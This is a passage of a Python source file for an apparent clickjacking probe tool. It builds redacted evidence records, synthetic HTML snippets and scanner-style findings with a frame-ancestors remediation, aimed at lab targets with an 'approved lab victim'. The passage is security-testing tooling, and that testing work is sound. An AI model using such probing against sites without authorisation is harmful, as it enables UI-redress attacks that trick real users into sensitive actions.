            "responseSha256": _sha(response),
            "responseBodySha256": _sha(response_body),
            "responseBodyLength": len(response_body.encode("utf-8")),
            "responseStatus": observation["status"],
            "responseExcerptTruncated": False,
            "authContextSha256": self._auth_context_sha if _same_origin(observation["url"], getattr(self, "_target", observation["url"])) and self._auth_context_sha else None,
        }

    def _sanitize(self, value: Any) -> str:
        safe = str(value or "").replace("\0", "")
        for secret in sorted(getattr(self, "_secrets", set()), key=len, reverse=True):
            if secret:
                safe = safe.replace(secret, f"[REDACTED sha256={_sha(secret)} len={len(secret)}]")
        return re.sub(r"(?im)^(authorization|cookie|set-cookie|x-api-key)\s*:.*$", lambda match: f"{match.group(1)}: [REDACTED]", safe)

    def _root_evidence(self, body: str) -> str:
        state = "is-solved" if _is_solved(body) else "is-notsolved" if _is_unsolved(body) else "state-unknown"
        exploit = " exploit-server-link" if "exploit-server" in body.lower() or "exploit server" in body.lower() else ""
        return f"<html><body class=\"{state}\"><a href=\"/my-account\">My account</a><span>{exploit.strip()}</span></body></html>"

    def _account_evidence(self, protected: bool, action_label: str) -> str:
        policy = "protected" if protected else "frameable"
        if action_label == "Update email":
            control = (
                f'<input name="email" value="{html.escape(PREFILLED_EMAIL, quote=True)}">'
                "<button>Update email</button>"
            )
        else:
            control = '<input type="hidden" name="csrf" value="[REDACTED]"><button>Delete account</button>'
        return f'<html><body data-framing="{policy}"><form method="POST">{control}</form></body></html>'

    def _frame_evidence(self, direct: Dict[str, Any], framed: Dict[str, Any], nonce: str = "runtime") -> str:
        return json.dumps({"nonce": nonce, "viewport": [VIEWPORT_WIDTH, VIEWPORT_HEIGHT], "directRect": direct, "framedRect": framed, "center": _center(direct), "centerInside": _center_inside(_center(direct), framed)}, separators=(",", ":"), sort_keys=True)

    def _finding(self, action_url: str, verification: Dict[str, Any]) -> Dict[str, Any]:
        decisive = verification["clickjackingEvidence"]["steps"][4]
        return {
            "template-id": "xasm-clickjacking-single-click-sensitive-action-verified",
            "matcher-name": "browser-aligned-victim-delivered-state-change",
            "matched-at": action_url,
            "host": _origin(action_url),
            "type": "http",
            "request": decisive["request"],
            "response": decisive["response"],
            "evidence": verification,
            "info": {
                "name": "Clickjacking Enables a Sensitive Authenticated Action",
                "severity": "medium",
                "description": "A frameable authenticated page exposed a visible sensitive action at stable browser coordinates, and a tool-owned cross-origin overlay caused the approved lab victim to complete that action.",
                "remediation": "Set a restrictive Content-Security-Policy frame-ancestors directive (preferably 'none') and retain X-Frame-Options as legacy defense in depth.",
                "classification": {"cwe-id": ["CWE-1021", "CWE-451"]},
            },
        }

    def _no_finding(self, target: str, proof_level: str, reason: str, browser: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        steps = list((browser or {}).get("steps") or [])
        verification = {
            "verified": False,
            "fallback": False,
            "mode": MODE,
            "proofLevel": proof_level,
            "reason": self._sanitize(reason),
            "frameRendered": bool((browser or {}).get("frameRendered")),
            "requestCount": len(steps),
            "scopeEnforcedInBrowser": True,
            "clickjackingEvidence": {"version": 1, "steps": steps},
        }
        return {"success": True, "tool": self.name, "target": target, "mode": MODE, "proofLevel": proof_level, "verified": False, "fallback": False, "requestCount": len(steps), "findings": [], "total_findings": 0, "verification": verification, "summary": {"requests": len(steps), "findings": 0, "fallback": False, "reason": verification["reason"]}}

    def _error(self, message: str, target: Optional[str] = None) -> Dict[str, Any]:
        return {"success": False, "tool": self.name, "target": target, "mode": MODE, "verified": False, "fallback": False, "error": self._sanitize(message), "findings": []}


def get_tool() -> WebClickjackingProbeTool:
    return WebClickjackingProbeTool()
